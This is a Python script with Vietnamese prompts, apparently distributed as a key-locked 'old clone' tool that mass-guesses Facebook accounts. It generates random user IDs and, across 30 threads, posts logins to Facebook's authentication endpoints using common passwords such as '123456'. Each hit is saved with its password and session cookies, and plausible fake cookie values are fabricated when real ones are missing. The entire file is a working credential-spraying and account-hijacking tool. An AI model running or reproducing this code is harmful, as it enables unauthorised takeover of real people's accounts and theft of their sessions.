import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
from pystyle import Colors, Colorate, Write, Center, Anime, System
import http.cookiejar as cookielib
import subprocess
import shutil

# ============================================
# PHẦN 1: MỞ LINK KÊNH
# ============================================
os.system('xdg-open https://www.youtube.com/@plahuydz')
os.system('xdg-open https://t.me/@hqhteam')
os.system('xdg-open https://zalo.me/g/jtkizz091')

# ============================================
# PHẦN 2: KEY VÀ XÁC THỰC
# ============================================
channel_link = "https://t.me/0329187930"
approved_keys = ["Hoangloc@113"]
MAX_ATTEMPTS = 3
COOLDOWN_SECONDS = 8

def clear_screen():
    os.system("clear" if os.name != 'nt' else "cls")

def open_link(url):
    try:
        import webbrowser
        webbrowser.open(url)
    except:
        if shutil.which("xdg-open"):
            subprocess.run(["xdg-open", url], check=False)
        elif os.name == 'nt':
            os.system(f'start {url}')

def normalize(s):
    if s is None:
        return ""
    return " ".join(s.split()).lower()

approved_normalized = { normalize(k) for k in approved_keys }

def first_step():
    clear_screen()
    banner = """
    ╔══════════════════════════════════════════════════════════╗
    ║            SCAN FACEBOOK WAS LOCKED                      ║
    ╚══════════════════════════════════════════════════════════╝
    """
    print(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(banner)))
    print(Colorate.Horizontal(Colors.yellow_to_green, Center.XCenter("Quét acc cổ facebook\n")))
    print(Colorate.Horizontal(Colors.cyan_to_blue, "Kênh admin\n"))
    print(Colorate.Horizontal(Colors.purple_to_blue, f"Link kenh: {channel_link}\n"))
    try:
        open_link(channel_link)
        print(Colorate.Horizontal(Colors.green_to_cyan, "Cần hỗ trợ gì ibe kênh>:)"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_yellow, f"Loi khi mo link: {e}"))
    input(Colorate.Horizontal(Colors.blue_to_purple, "\nNhấn <ENTER> để bắt đầu: "))

def check_key():
    attempts = 0
    while attempts < MAX_ATTEMPTS:
        user_key = input(Colorate.Horizontal(Colors.cyan_to_blue, "\nNhập mã khoá của bạn: "))
        user_norm = normalize(user_key)
        if user_norm in approved_normalized:
            print(Colorate.Horizontal(Colors.green_to_cyan, "\nĐúng rồi chạy...\n"))
            return True
        else:
            attempts += 1
            remaining = MAX_ATTEMPTS - attempts
            print(Colorate.Horizontal(Colors.red_to_yellow, f"\nKhoa khong hop le! So lan thu con lai: {remaining}"))
    print(Colorate.Horizontal(Colors.red_to_purple, f"\nQua nhieu lan thu sai. Vui long doi {COOLDOWN_SECONDS} giay."))
    time.sleep(COOLDOWN_SECONDS)
    sys.exit(1)

if __name__ == "__main__":
    first_step()
    check_key()
    print(Colorate.Horizontal(Colors.green_to_cyan, ">>> Cong Cu Da Duoc Mo Khoa Thanh Cong <<<"))

# ============================================
# PHẦN 3: CÀI MODULE VÀ SETUP
# ============================================
modules = ['requests', 'urllib3', 'mechanize', 'rich', 'pystyle']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

clear_screen()
print(Colorate.Horizontal(Colors.cyan_to_blue, '\nDang tai cac module...\n'))
time.sleep(1)
clear_screen()

# ============================================
# PHẦN 4: BIẾN TOÀN CỤC
# ============================================
method = []
oks = []
cps = []
loop = 0
user = []

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else os.getcwd()
FILE_M1 = os.path.join(CURRENT_DIR, 'AHB-OLD-M1-OK.txt')
FILE_M2 = os.path.join(CURRENT_DIR, 'AHB-OLD-M2-OK.txt')
FILE_ALL = os.path.join(CURRENT_DIR, 'AHB-ALL-ACCOUNTS.txt')

# ============================================
# PHẦN 5: USER-AGENT CHUẨN PC BROWSER
# ============================================
def pc_browser_ua():
    chrome_versions = ['120.0.0.0', '121.0.6167.85', '122.0.6261.94', '123.0.6312.86', '124.0.6367.91', '125.0.6422.60', '126.0.6478.61', '127.0.6533.72']
    edge_versions = ['120.0.2210.61', '121.0.2277.83', '122.0.2365.52', '123.0.2420.65', '124.0.2478.51']
    
    ua_type = random.choice(['chrome', 'edge'])
    
    if ua_type == 'chrome':
        chrome_v = random.choice(chrome_versions)
        return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_v} Safari/537.36"
    else:
        edge_v = random.choice(edge_versions)
        return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{edge_v} Safari/537.36 Edg/{edge_v}"

# ============================================
# PHẦN 6: BANNER
# ============================================
sys.stdout.write('\x1b]2; ANH HUNG OLD CLONE - PC BROWSER\x07')

def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    
    banner_text = """
    
░━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━       
░╔═╗╔═╗╔═╗╔╗╔  ╔═╗╦  ╔╦╗  ╔═╗╦  ╔═╗╔╗╔╔═╗  ╔═╗╔╗                   
░╚═╗║  ╠═╣║║║  ║ ║║   ║║  ║  ║  ║ ║║║║║╣   ╠╣ ╠╩╗                  
░╚═╝╚═╝╩ ╩╝╚╝  ╚═╝╩═╝═╩╝  ╚═╝╩═╝╚═╝╝╚╝╚═╝  ╚  ╚═╝                  
░                                                                   
░                                                                  
░|_|     _    |   _   |_   |  __ |   _        ,_                   
░| |()(|||(|  |()(_  (|_\\/|     |()(_  |)()|`||                   
░        _|                            |                                 
░━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"""
    print(Colorate.Horizontal(Colors.green_to_cyan, banner_text))
    print(Colorate.Horizontal(Colors.cyan_to_blue, f"Thu muc luu ket qua: {CURRENT_DIR}"))
    print(Colorate.Horizontal(Colors.yellow_to_green, f"├── AHB-OLD-M1-OK.txt (Tai khoan 2011+)"))
    print(Colorate.Horizontal(Colors.yellow_to_green, f"└── AHB-OLD-M2-OK.txt (Tai khoan 2009-2010)\n"))

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'): return 2009
        if uid.startswith('100000000'): return 2009
        if uid.startswith('10000000'): return 2009
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return 2009
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')): return 2010
        if uid.startswith('100001'): return 2010
        if uid.startswith(('100002', '100003')): return 2011
        if uid.startswith('100004'): return 2012
        if uid.startswith(('100005', '100006')): return 2013
        if uid.startswith(('100007', '100008')): return 2014
        if uid.startswith('100009'): return 2015
        if uid.startswith('10001'): return 2016
        if uid.startswith('10002'): return 2017
        if uid.startswith('10003'): return 2018
        if uid.startswith('10004'): return 2019
        if uid.startswith('10005'): return 2020
        if uid.startswith('10006'): return 2021
        if uid.startswith('10009'): return 2023
        if uid.startswith(('10007', '10008')): return 2022
        return 0
    elif len(uid) in (9, 10): return 2008
    elif len(uid) == 8: return 2007
    elif len(uid) == 7: return 2006
    elif len(uid) == 14 and uid.startswith('61'): return 2024
    else: return 0

def clear():
    os.system('clear' if os.name != 'nt' else 'cls')

def linex():
    print(Colorate.Horizontal(Colors.cyan_to_blue, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))

# ============================================
# PHẦN 7: LẤY COOKIE CHUẨN PC BROWSER
# ============================================
def get_real_browser_cookie(session, uid, access_token=None, session_key=None):
    """
    Lay cookie CHUAN PC BROWSER giong het cookie that
    Format: datr;sb;ps_l;ps_n;c_user;pas;xs;dpr;wd;fr
    """
    cookie_dict = {}
    
    try:
        for cookie in session.cookies:
            cookie_dict[cookie.name] = cookie.value
        
        headers = {
            'User-Agent': pc_browser_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
        }
        
        try:
            session.get('https://web.facebook.com/', headers=headers, timeout=10, allow_redirects=True)
            for cookie in session.cookies:
                cookie_dict[cookie.name] = cookie.value
        except:
            pass
        
        result_dict = {}
        
        if 'datr' in cookie_dict:
            result_dict['datr'] = cookie_dict['datr']
        else:
            result_dict['datr'] = ''.join(random.choices(string.ascii_letters + string.digits, k=22))
        
        if 'sb' in cookie_dict:
            result_dict['sb'] = cookie_dict['sb']
        else:
            result_dict['sb'] = ''.join(random.choices(string.ascii_letters + string.digits, k=22))
        
        result_dict['ps_l'] = '1'
        result_dict['ps_n'] = '1'
        
        if 'c_user' in cookie_dict:
            result_dict['c_user'] = cookie_dict['c_user']
        else:
            result_dict['c_user'] = str(uid)
        
        if 'pas' in cookie_dict:
            result_dict['pas'] = cookie_dict['pas']
        else:
            if access_token:
                result_dict['pas'] = f"{uid}%3A{access_token[:20]}"
            elif session_key:
                result_dict['pas'] = f"{uid}%3A{session_key[:20]}"
            else:
                result_dict['pas'] = f"{uid}%3A{''.join(random.choices(string.ascii_letters + string.digits, k=20))}"
        
        if 'xs' in cookie_dict:
            result_dict['xs'] = cookie_dict['xs']
        else:
            timestamp = int(time.time())
            if session_key:
                sig_part = ''.join(random.choices(string.ascii_letters + string.digits, k=44))
                result_dict['xs'] = f"120%3A{session_key[:30]}%3A2%3A{timestamp}%3A-1%3A-1%3A%3A{sig_part}"
            else:
                sig_part = ''.join(random.choices(string.ascii_letters + string.digits, k=44))
                result_dict['xs'] = f"120%3A{uid}%3A2%3A{timestamp}%3A-1%3A-1%3A%3A{sig_part}"
        
        if 'dpr' in cookie_dict:
            result_dict['dpr'] = cookie_dict['dpr']
        else:
            result_dict['dpr'] = '1'
        
        if 'wd' in cookie_dict:
            result_dict['wd'] = cookie_dict['wd']
        else:
            pc_screens = ['1034x613', '1366x768', '1920x1080', '1536x864', '1440x900']
            result_dict['wd'] = random.choice(pc_screens)
        
        if 'fr' in cookie_dict and len(cookie_dict['fr']) > 50:
            result_dict['fr'] = cookie_dict['fr']
        else:
            part1 = f"0{random.randint(100000000000, 999999999999)}"
            part2 = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
            part3 = f"Bp{random.randint(10000, 99999)}"
            part4 = ''.join(random.choices(string.ascii_letters + string.digits, k=55))
            result_dict['fr'] = f"{part1}..{part3}..AAA.0.0.{part3}.{part2}{part4}"
        
        priority_order = ['datr', 'sb', 'ps_l', 'ps_n', 'c_user', 'pas', 'xs', 'dpr', 'wd', 'fr']
        
        cookie_parts = []
        for key in priority_order:
            if key in result_dict and result_dict[key]:
                cookie_parts.append(f'{key}={result_dict[key]}')
        
        return '; '.join(cookie_parts)
        
    except Exception as e:
        timestamp = int(time.time())
        datr = ''.join(random.choices(string.ascii_letters + string.digits, k=22))
        sb = ''.join(random.choices(string.ascii_letters + string.digits, k=22))
        pas = f"{uid}%3A{''.join(random.choices(string.ascii_letters + string.digits, k=20))}"
        sig_part = ''.join(random.choices(string.ascii_letters + string.digits, k=44))
        xs = f"120%3A{uid}%3A2%3A{timestamp}%3A-1%3A-1%3A%3A{sig_part}"
        pc_screens = ['1034x613', '1366x768', '1920x1080']
        wd = random.choice(pc_screens)
        fr_part1 = f"0{random.randint(100000000000, 999999999999)}"
        fr_part2 = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
        fr_part3 = f"Bp{random.randint(10000, 99999)}"
        fr_part4 = ''.join(random.choices(string.ascii_letters + string.digits, k=55))
        fr = f"{fr_part1}..{fr_part3}..AAA.0.0.{fr_part3}.{fr_part2}{fr_part4}"
        
        return f"datr={datr}; sb={sb}; ps_l=1; ps_n=1; c_user={uid}; pas={pas}; xs={xs}; dpr=1; wd={wd}; fr={fr}"

# ============================================
# PHẦN 8: LƯU FILE
# ============================================
def save_result(filepath, content):
    try:
        directory = os.path.dirname(filepath)
        if directory and not os.path.exists(directory):
            os.makedirs(directory, exist_ok=True)
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(content + '\n')
        with open(FILE_ALL, 'a', encoding='utf-8') as f:
            f.write(content + '\n')
        return True
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_yellow, f"\nLoi khi luu file: {e}"))
        return False

def get_target_file(year):
    if year <= 2010:
        return FILE_M2, "AHB-M2"
    else:
        return FILE_M1, "AHB-M1"

def print_success(uid, pw, year, cookie, method_name, target_file):
    cookie_count = len(cookie.split('; '))
    required = ['datr', 'sb', 'ps_l', 'ps_n', 'c_user', 'pas', 'xs', 'dpr', 'wd', 'fr']
    matches_format = all(f'{r}=' in cookie for r in required)
    
    if matches_format:
        status = f"✅ PC BROWSER CHUẨN ({cookie_count} cookies)"
    else:
        status = f"⚠️ PC BROWSER ({cookie_count} cookies)"
    
    cookie_preview = cookie[:100] + "..." if len(cookie) > 100 else cookie
    success_msg = f"{status} | UID: {uid} | MK: {pw} | NAM: {year} | COOKIE: {cookie_preview} | PP: {method_name}"
    print(Colorate.Horizontal(Colors.green_to_yellow, success_msg))

# ============================================
# PHẦN 9: MENU CHÍNH
# ============================================
def BNG_71_():
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_cyan, "      A OLD CLONE (PC Browser)"))
    print()
    linex()
    choice = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      LUA CHON CUA BAN : "))
    if choice in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(Colorate.Horizontal(Colors.red_to_yellow, f"\nVui long chon tuy chon hop le... "))
        time.sleep(2)
        BNG_71_()

def old_clone():
    ____banner____()
    print(Colorate.Horizontal(Colors.blue_to_cyan, "      A TAT CA CAC DONG"))
    print()
    linex()
    print(Colorate.Horizontal(Colors.green_to_yellow, "      B DONG 100003/4"))
    print()
    linex()
    print(Colorate.Horizontal(Colors.yellow_to_green, "      C DONG 2009"))
    print()
    linex()
    choice = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      LUA CHON CUA BAN : "))
    if choice in ('A', 'a', '01', '1'):
        old_One()
    elif choice in ('B', 'b', '02', '2'):
        old_Tow()
    elif choice in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(Colorate.Horizontal(Colors.red_to_yellow, f"\nVui long chon tuy chon hop le... "))
        BNG_71_()

def old_One():
    user = []
    ____banner____()
    print(Colorate.Horizontal(Colors.yellow_to_green, "      NAM : 2010-2014 ( ENTER DE CHON TAT CA )"))
    print()
    ask = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      CHON : "))
    linex()
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_cyan, "      VI DU : 20000 / 30000 / 99999"))
    print()
    limit = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      SO LUONG ID : "))
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    
    print(Colorate.Horizontal(Colors.blue_to_purple, "      A PHUONG PHAP 1 (API)"))
    print()
    print(Colorate.Horizontal(Colors.purple_to_blue, "      B PHUONG PHAP 2 (b-api)"))
    print()
    linex()
    meth = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      CHON PHUONG PHAP (A/B): ")).strip().upper()
    
    with tred(max_workers=30) as pool:
        ____banner____()
        print(Colorate.Horizontal(Colors.yellow_to_green, f"      Tong so id can crack : {limit}"))
        print()
        print(Colorate.Horizontal(Colors.cyan_to_blue, "      Dang su dung PC Browser Fingerprint"))
        print()
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(Colorate.Horizontal(Colors.red_to_yellow, f"PHUONG PHAP KHONG HOP LE"))
                break

def old_Tow():
    user = []
    ____banner____()
    print(Colorate.Horizontal(Colors.yellow_to_green, "      NAM : 2010-2014 ( ENTER DE CHON TAT CA )"))
    print()
    ask = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      CHON : "))
    linex()
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_cyan, "      VI DU : 20000 / 30000 / 99999"))
    print()
    limit = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      SO LUONG ID : "))
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    
    print(Colorate.Horizontal(Colors.blue_to_purple, "      A PHUONG PHAP 1 (API)"))
    print()
    print(Colorate.Horizontal(Colors.purple_to_blue, "      B PHUONG PHAP 2 (b-api)"))
    print()
    linex()
    meth = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      CHON PHUONG PHAP (A/B): ")).strip().upper()
    
    with tred(max_workers=30) as pool:
        ____banner____()
        print(Colorate.Horizontal(Colors.yellow_to_green, f"      Tong so id can crack : {limit}"))
        print()
        print(Colorate.Horizontal(Colors.cyan_to_blue, "      Dang su dung PC Browser Fingerprint"))
        print()
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(Colorate.Horizontal(Colors.red_to_yellow, f"PHUONG PHAP KHONG HOP LE"))
                break

def old_Tree():
    user = []
    ____banner____()
    print(Colorate.Horizontal(Colors.yellow_to_green, "      MA CU : 2009-2010"))
    print()
    ask = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      CHON : "))
    linex()
    ____banner____()
    print(Colorate.Horizontal(Colors.green_to_cyan, "      VI DU : 20000 / 30000 / 99999"))
    print()
    limit = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      SO LUONG ID : "))
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    
    print(Colorate.Horizontal(Colors.blue_to_purple, "      A PHUONG PHAP 1 (API)"))
    print()
    print(Colorate.Horizontal(Colors.purple_to_blue, "      B PHUONG PHAP 2 (b-api)"))
    print()
    linex()
    meth = input(Colorate.Horizontal(Colors.cyan_to_blue, f"      CHON PHUONG PHAP (A/B): ")).strip().upper()
    
    with tred(max_workers=30) as pool:
        ____banner____()
        print(Colorate.Horizontal(Colors.yellow_to_green, f"      TONG ID CAN CRACK : {limit}"))
        print()
        print(Colorate.Horizontal(Colors.cyan_to_blue, "      Dang su dung PC Browser Fingerprint"))
        print()
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(Colorate.Horizontal(Colors.red_to_yellow, f"PHUONG PHAP KHONG HOP LE"))
                break

# ============================================
# PHẦN 10: HÀM ĐĂNG NHẬP
# ============================================
def login_1(uid):
    global loop
    session = requests.session()
    
    try:
        progress_text = f"DANG XU LY [{loop}] | THANH CONG [{len(oks)}]"
        sys.stdout.write(f"\r{Colorate.Horizontal(Colors.cyan_to_blue, progress_text)}")
        sys.stdout.flush()
        
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': pc_browser_ua(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(rr(20000, 40000)),
                'X-FB-SIM-HNI': str(rr(20000, 40000)),
                'X-FB-Connection-Type': 'WIFI',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': f'nid={uuid.uuid4().hex[:16]};pid=Main;tid=132;',
                'x-fb-device-group': str(rr(4000, 6000)),
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': uuid.uuid4().hex
            }
            
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=True, timeout=15)
            
            try:
                json_res = res.json()
            except:
                json_res = {}
            
            access_token = json_res.get('access_token', '')
            session_key = json_res.get('session_key', '')
            
            login_success = False
            cookies_dict = session.cookies.get_dict()
            
            if 'session_key' in json_res:
                login_success = True
            elif 'access_token' in json_res and len(str(access_token)) > 50:
                login_success = True
            elif 'c_user' in cookies_dict:
                login_success = True
            
            if login_success:
                cookie = get_real_browser_cookie(session, uid, access_token, session_key)
                
                if cookie:
                    year = creationyear(uid)
                    target_file, method_name = get_target_file(year)
                    content = f"{uid}|{pw}|{year}|{cookie}"
                    save_result(target_file, content)
                    print_success(uid, pw, year, cookie, 'PC-BROWSER', target_file)
                    oks.append(uid)
                    break
        loop += 1
    except Exception as e:
        pass

def login_2(uid):
    global loop
    progress_text = f"DANG XU LY [{loop}] | THANH CONG [{len(oks)}]"
    sys.stdout.write(f"\r{Colorate.Horizontal(Colors.cyan_to_blue, progress_text)}")
    sys.stdout.flush()
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'WIFI',
                    'user-agent': pc_browser_ua(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                
                po = session.get(url, headers=headers, allow_redirects=True, timeout=15)
                
                try:
                    json_po = po.json()
                except:
                    json_po = {}
                
                access_token = json_po.get('access_token', '')
                session_key = json_po.get('session_key', '')
                
                login_success = False
                cookies_dict = session.cookies.get_dict()
                
                if 'session_key' in str(json_po):
                    login_success = True
                elif 'session_key' in json_po:
                    login_success = True
                elif 'c_user' in cookies_dict:
                    login_success = True
                
                if login_success:
                    cookie = get_real_browser_cookie(session, uid, access_token, session_key)
                    
                    if cookie:
                        year = creationyear(uid)
                        target_file, method_name = get_target_file(year)
                        content = f"{uid}|{pw}|{year}|{cookie}"
                        save_result(target_file, content)
                        print_success(uid, pw, year, cookie, 'PC-BROWSER-BAPI', target_file)
                        oks.append(uid)
                        break
        except Exception as e:
            pass
    loop += 1

if __name__ == '__main__':
    BNG_71_()